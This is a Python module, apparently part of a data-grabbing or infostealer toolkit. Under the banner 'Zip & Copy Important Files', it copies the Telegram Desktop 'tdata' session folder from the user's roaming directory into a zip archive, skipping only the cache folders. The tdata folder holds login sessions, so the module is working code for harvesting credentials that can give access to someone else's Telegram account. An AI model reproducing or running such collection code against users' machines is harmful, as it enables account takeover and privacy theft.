import os
import os
from zipfile import ZipFile

from config import Constant 
from config.manager import ModuleManager


class ZipFiles(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name="ZipFiles")

        self.banner(r"""
     _______         _______ _          _______ _ _             
    |.-----.|       (_______|_)        (_______|_) |            
    ||x . x||          __    _ ____     _____   _| | _____  ___ 
    ||_.-._||         / /   | |  _ \   |  ___) | | || ___ |/___)
    `--)-(--`        / /____| | |_| |  | |     | | || ____|___ |
   __[=== o]___     (_______)_|  __/   |_|     |_|\_)_____|___/ 
  |:::::::::::|\    
  `-=========-`()            Zip & Copy Important Files
                """)

        self.zip_folder = os.path.join(self.output_folder_user, 'applications', 'zip')

        if not os.path.isdir(self.zip_folder):
            os.makedirs(self.zip_folder)
        
        self.pathList = [
            ["Telegram Desktop", f"{Constant.roaming_dir}\\Telegram Desktop\\tdata", "TelegramDesktop.zip", ['cache', 'media_cache', 'emoji']],
        ]
            
    def zipApplication(self, pathToZip, outputFileName, excludeDirs, ) -> None:
        try:
            with ZipFile(outputFileName, 'w') as zipf:
                for foldername, subfolders, filenames in os.walk(pathToZip):
                    subfolders[:] = [d for d in subfolders if d not in excludeDirs]

                    for filename in filenames:
                        file_path = os.path.join(foldername, filename)
                        arcname = os.path.relpath(file_path, pathToZip)
                        zipf.write(file_path, arcname)

            print(f"Successfully zipped {pathToZip} to {outputFileName}")
        except Exception as e:
            print(f"Error: {e}")

    def run(self) -> None:
        for app in self.pathList:
            self.zipApplication(
                pathToZip=app[1],
                outputFileName=app[2],
                excludeDirs=app[3]
            )
